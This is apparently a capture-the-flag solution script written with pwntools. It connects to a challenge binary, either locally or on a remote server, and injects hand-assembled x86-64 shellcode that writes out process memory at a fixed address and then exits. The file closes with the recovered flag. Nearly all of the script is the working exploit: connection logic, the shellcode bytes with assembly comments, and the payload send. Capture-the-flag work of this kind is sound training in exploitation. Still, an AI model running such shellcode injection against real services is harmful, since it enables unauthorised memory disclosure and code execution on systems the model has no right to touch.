# Arch:       amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

from pwn import *

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve():
    p = conn()
    if args.REMOTE:
        p.sendline(b"13523090")
        p.sendline(b"10")

    exe = './10'
    context.binary = ELF(exe, checksec=False)
    context.log_level = 'debug'

    # Attack goes here
    shellcode = (
        b"\x48\x31\xc0"                     # xor rax, rax
        b"\xb0\x01"                         # mov al, 1
        b"\x48\x31\xff"                     # xor rdi, rdi
        b"\x48\xff\xc7"                     # inc rdi
        b"\x48\xc7\xc6\x20\x41\x40\x00"     # mov rsi, 0x404120
        b"\x48\x31\xd2"                     # xor rdx, rdx
        b"\xb2\x90"                         # mov dl, 0x90
        b"\x0f\x05"                         # syscall
        b"\x48\x31\xc0"                     # xor rax, rax
        b"\xb0\x3c"                         # mov al, 60
        b"\x48\x31\xff"                     # xor rdi, rdi
        b"\x0f\x05"                         # syscall
    )

    # shellcode
    p.sendline(shellcode)
    p.interactive()

solve()

# Orkom3{A thousand faces in a thousand places... can you find the answer?_68a1383603cd7a86}